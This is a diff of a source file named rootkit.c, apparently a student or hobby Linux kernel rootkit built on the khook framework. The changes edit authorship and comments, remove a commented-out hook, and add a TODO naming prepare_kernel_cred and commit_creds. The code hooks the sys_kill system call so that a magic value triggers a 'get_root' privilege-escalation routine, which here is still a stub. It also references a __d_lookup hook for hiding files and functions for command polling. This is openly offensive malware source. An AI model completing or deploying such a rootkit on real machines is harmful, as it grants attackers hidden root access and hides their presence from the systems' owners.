@@ -1,7 +1,7 @@
 /**
  * @file    rootkit.c
- * @author  Aaron Lichtman, Arch Gupta
- * @brief   A rootkit. TODO: Expand description
+ * @author  Aaron Lichtman
+ * @brief   A rootkit. // TODO: Expand description
  */
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -23,7 +23,6 @@
 #include "khook/engine.c"
 
 MODULE_AUTHOR("Aaron Lichtman");
-MODULE_AUTHOR("Arch Gupta");
 MODULE_DESCRIPTION("Linux rootkit.");
 MODULE_VERSION("0.1");
 MODULE_LICENSE("GPL");  // So the kernel doesn't complain about proprietary code
@@ -165,10 +164,11 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
  */
 static long get_root(void) {
 	printk(KERN_EMERG "One root coming right up.");
-	// TODO
+	// TODO: prepare_kernel_cred and then commit_creds, in <linux/cred.c>
 	return 0;
 }
 
+// BUG: Doesn't hook sys_kill.
 KHOOK_EXT(long, sys_kill, long, long);
 static long khook_sys_kill(long pid, long sig) {
 	printk(KERN_EMERG "sys_kill -- %s pid: %ld sig: %ld", current->comm,  pid, sig);
@@ -179,19 +179,6 @@ static long khook_sys_kill(long pid, long sig) {
 		return KHOOK_ORIGIN(sys_kill, pid, sig);
 	}
 }
-
-
-// // BUG: COMPILES BUT DOESN'T HOOK KILL.
-// KHOOK_EXT(long, sys_kill, pid_t, long);
-// static long khook_sys_kill(pid_t pid, long sig) {
-// 	printk(KERN_EMERG "PID IS: %u", pid);
-// 	printk(KERN_EMERG "ROOT_PRIV_ESC_MAGIC is: %d", ROOT_PRIV_ESC_MAGIC);
-// 	if (pid == ROOT_PRIV_ESC_MAGIC) {
-// 		return get_root();
-// 	} else {
-// 		return KHOOK_ORIGIN(sys_kill, pid, sig);
-// 	}
-// }
 
 /**
  * Timer and Command Polling Functions
